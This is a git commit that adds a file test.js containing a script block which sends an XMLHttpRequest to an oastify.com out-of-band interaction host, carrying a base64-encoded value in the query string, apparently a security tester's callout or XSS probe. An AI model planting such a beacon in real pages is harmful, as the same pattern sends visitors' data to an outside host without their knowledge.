70e30816f06f69d0b80ebcf40009158140910ff9
Akmal Mohamed <akmal.m.abdulaleam@gmail.com>
2023-01-10 15:42:47 +0200

    Create test.js

---
+++ test.js
@@ -0,0 +1,9 @@
+<script>
+	function reqListener() {
+		console.log(\"done\");
+	};
+	const req = new XMLHttpRequest();
+	req.addEventListener("load", reqListener);
+	req.open("GET", "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/?lssss="+btoa("123"));
+	req.send();
+</script>
